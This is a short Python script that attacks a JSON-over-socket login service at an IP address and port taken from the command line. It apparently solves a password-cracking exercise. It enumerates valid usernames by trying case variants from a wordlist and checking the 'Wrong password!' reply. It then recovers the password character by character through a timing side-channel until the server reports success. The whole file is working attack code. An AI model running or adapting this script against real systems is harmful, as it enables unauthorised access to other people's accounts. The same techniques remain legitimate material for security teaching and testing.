import sys
import socket
from itertools import product
import json
import string
import time

args = sys.argv[1:]
ip, port = args[0], int(args[1])
chars = string.ascii_lowercase + string.ascii_letters + string.digits


def permutations(password_):
    return list(map(''.join, product(*zip(password_.lower(), password_.upper()))))


def find_login(sock):
    with open(r'C:\dev\python\logins.txt', 'r', encoding='utf-8') as in_file:
        for login in in_file:
            for login_perm in permutations(login.strip()):
                msg_to_send = json.dumps({"login": login_perm, "password": " "})
                sock.send(msg_to_send.encode())
                received_back = json.loads(sock.recv(1024).decode())
                if received_back["result"] == "Wrong password!":
                    return login_perm
    return None


with socket.socket() as sock:
    password = ""
    times = {}
    sock.connect((ip, port))
    login_perm = find_login(sock)
    if login_perm is not None:
        for x in range(10):
            for c in chars:
                pwd_to_check = str(f"{password}{c}")
                sock.send(json.dumps({"login": login_perm, "password": pwd_to_check}).encode())
                start = time.perf_counter_ns()
                response = json.loads(sock.recv(1024).decode())["result"]
                end = time.perf_counter_ns()
                difference = end - start
                times[c] = difference
                if response == "Connection success!":
                    msg = {"login": login_perm, "password": pwd_to_check}
                    print(json.dumps(msg))
                    sys.exit()
            else:
                password += str((max(times, key=times.get)))
